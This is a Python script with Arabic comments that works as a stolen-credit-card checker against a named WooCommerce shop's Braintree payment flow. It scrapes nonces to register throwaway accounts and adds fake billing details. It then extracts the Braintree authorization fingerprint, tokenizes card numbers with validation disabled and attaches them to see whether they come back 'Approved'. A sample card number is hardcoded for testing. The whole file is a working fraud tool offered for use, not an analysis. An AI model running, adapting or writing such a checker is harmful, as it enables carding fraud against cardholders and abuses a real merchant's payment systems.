import requests
import re
import base64
import uuid
import random
import string

def bra1(card_data):
    """
    فحص بطاقة على dnalasering.com (Braintree - Auth)
    يقوم بـ: تسجيل حساب جديد ← إضافة عنوان ← إضافة بطاقة
    card_data: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        card_data = card_data.strip()
        n = card_data.split("|")[0]
        mm = card_data.split("|")[1]
        yy = card_data.split("|")[2]
        cvc = card_data.split("|")[3]
        
        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        n = n.replace(" ", "")
        
        # ===== بيانات عشوائية للتسجيل =====
        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
        password = f"Pass{random.randint(1000,9999)}"
        
        session = requests.Session()
        
        # =========================================================
        # الخطوة 1: فتح صفحة الحساب لاستخراج register nonce
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        response = session.get('https://www.dnalasering.com/my-account/', headers=headers)
        
        reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg_nonce:
            return "Declined"
        reg_nonce = reg_nonce.group(1)
        
        # =========================================================
        # الخطوة 2: تسجيل حساب جديد
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = {
            'email': email,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        response = session.post('https://www.dnalasering.com/my-account/', headers=headers, data=data)
        
        if 'wordpress_logged_in' not in str(session.cookies.get_dict()):
            return "Declined"
        
        # =========================================================
        # الخطوة 3: فتح صفحة إضافة العنوان (GET)
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        response = session.get('https://www.dnalasering.com/my-account/edit-address/billing/', headers=headers)
        
        addr_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text)
        if not addr_nonce:
            return "Declined"
        addr_nonce = addr_nonce.group(1)
        
        # =========================================================
        # الخطوة 4: إضافة عنوان الفوترة
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = {
            'billing_first_name': 'Test',
            'billing_last_name': 'User',
            'billing_company': 'Test',
            'billing_country': 'GB',
            'billing_address_1': '221 Baker Street',
            'billing_address_2': '',
            'billing_city': 'London',
            'billing_state': '',
            'billing_postcode': 'NW1 6XE',
            'billing_phone': '+442079460958',
            'billing_email': email,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': addr_nonce,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }
        response = session.post('https://www.dnalasering.com/my-account/edit-address/billing/', headers=headers, data=data)
        
        # =========================================================
        # الخطوة 5: فتح صفحة إضافة البطاقة
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        response = session.get('https://www.dnalasering.com/my-account/add-payment-method/', headers=headers)
        
        client_nonce = re.search(r'client_token_nonce":"([^"]+)"', response.text)
        if not client_nonce:
            return "Declined"
        client_nonce = client_nonce.group(1)
        
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not add_nonce:
            return "Declined"
        add_nonce = add_nonce.group(1)
        
        # =========================================================
        # الخطوة 6: الحصول على Authorization Fingerprint
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client_nonce,
        }
        response = session.post('https://www.dnalasering.com/wp-admin/admin-ajax.php', headers=headers, data=data)
        
        enc_data = response.json().get('data')
        if not enc_data:
            return "Declined"
        
        dec_data = base64.b64decode(enc_data).decode('utf-8')
        auth_fp = re.search(r'"authorizationFingerprint":"(.*?)"', dec_data)
        if not auth_fp:
            return "Declined"
        auth_fp = auth_fp.group(1)
        
        # =========================================================
        # الخطوة 7: Tokenize البطاقة (GraphQL)
        # =========================================================
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'authorization': f'Bearer {auth_fp}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy_full,
                        'cvv': cvc,
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        
        try:
            payment_nonce = response.json()['data']['tokenizeCreditCard']['token']
        except:
            return "Declined"
        
        # =========================================================
        # الخطوة 8: إضافة البطاقة إلى الحساب
        # =========================================================
        headers = {
            'authority': 'www.dnalasering.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.dnalasering.com',
            'referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        
        data = {
            'payment_method': 'braintree_credit_card',
            'wc-braintree-credit-card-card-type': 'master-card',
            'wc_braintree_credit_card_payment_nonce': payment_nonce,
            'wc_braintree_device_data': '',
            'wc-braintree-credit-card-tokenize-payment-method': 'true',
            'woocommerce-add-payment-method-nonce': add_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }
        
        response = session.post('https://www.dnalasering.com/my-account/add-payment-method/', headers=headers, data=data)
        text = response.text
        
        if 'Payment method successfully added' in text or 'Nice! New payment method added' in text:
            return '✅ Approved'
        elif 'Duplicate card exists in the vault' in text:
            return '✅ Approved (Duplicate)'
        else:
            error_match = re.search(r'<li>(.*?)</li>', text)
            if error_match:
                return f'❌ {error_match.group(1)}'
            return '❌ Declined'
        
    except Exception as e:
        return f'❌ Error: {str(e)}'


if __name__ == '__main__':
    card = "5205245099206347|12|2029|464"
    result = bra1(card)
    print(f'Card: {card}')
    print(f'Result: {result}')